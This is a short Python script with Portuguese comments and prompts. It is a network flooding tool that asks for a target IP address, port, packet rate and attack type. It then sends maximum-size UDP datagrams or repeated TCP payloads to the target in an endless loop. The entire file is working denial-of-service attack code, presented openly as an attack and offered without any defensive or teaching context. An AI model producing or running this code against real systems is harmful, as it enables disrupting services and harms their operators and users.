import socket
import sys
import time

def flood_udp(ip, port, packet_rate):
    # Cria um socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Envia pacotes UDP para o endereço IP e porta especificados
    while True:
        sock.sendto(b'0' * 65507, (ip, port))
        time.sleep(1/packet_rate)

def flood_tcp(ip, port, packet_rate):
    # Cria um socket TCP
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conecta-se ao endereço IP e porta especificados
    sock.connect((ip, port))
    
    # Envia pacotes TCP para o endereço IP e porta especificados
    while True:
        sock.send(b'0' * 65507)
        time.sleep(1/packet_rate)

# Recebe o endereço IP e a porta do usuário
ip = input("Digite o endereço IP do servidor remoto: ")
port = int(input("Digite a porta do servidor remoto: "))

# Recebe o número de pacotes por segundo do usuário
packet_rate = int(input("Digite o número de pacotes por segundo: "))

# Solicita o tipo de ataque de inundação (UDP ou TCP)
attack_type = input("Digite 'UDP' para ataque de inundação UDP ou 'TCP' para ataque de inundação TCP: ")

# Inicia o ataque de inundação
if attack_type == 'UDP':
    flood_udp(ip, port, packet_rate)
elif attack_type == 'TCP':
    flood_tcp(ip, port, packet_rate)
else:
    print("Tipo de ataque inválido.")
    sys.exit(1)
